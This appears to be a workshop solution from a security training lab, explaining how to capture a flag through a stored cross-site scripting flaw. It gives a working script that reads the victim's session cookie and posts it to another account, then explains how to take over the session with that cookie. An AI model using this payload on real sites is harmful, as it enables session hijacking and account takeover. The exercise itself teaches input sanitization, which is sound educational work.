## Workshop 2 Solutions
### 4 - Dan
Relevant information:

- Dan enables scripts on his profile.
- Dan can't use sendflags.php
- Enabling scripts disables the site from escaping HTML special characters

Dan's flag can be obtained from a Cross-site Scripting (XSS) attack. Enabling scripts means that any message sent to Dan will show up as it was typed in the HTML Dan loads. This means that script elements can be inserted into Dan's profile. This can be exploited in a number of ways; in this example, it will be used to send Dan's PHP session ID. This can be done with the following message:

```HTML
<form name=xxsform action=http://172.16.4.59/dm.php method=post>
 <input type=hidden id="sessionmessage" name=message value=":)">
 <input type=hidden name=user value="bryson">
</form>
<script>
document.getElementById("sessionmessage").value = document.cookie;
document.xxsform.submit();
</script>
```

Shortly afterwards, Dan's session cookie will show up in a DM on bryson's profile. Changing your session ID to this value will make you effectively become Dan. The easiest way to change a cookie is in-browser. In Firefox, this can be done by pressing the "edit and resend" button in the network dialog.

This point of this exercise is to demonstrate how destructive failing to perform input sanitation is.
As mentioned in the previous workshop, any and all input from the user should be assumed malicious and sanitized accordingly.
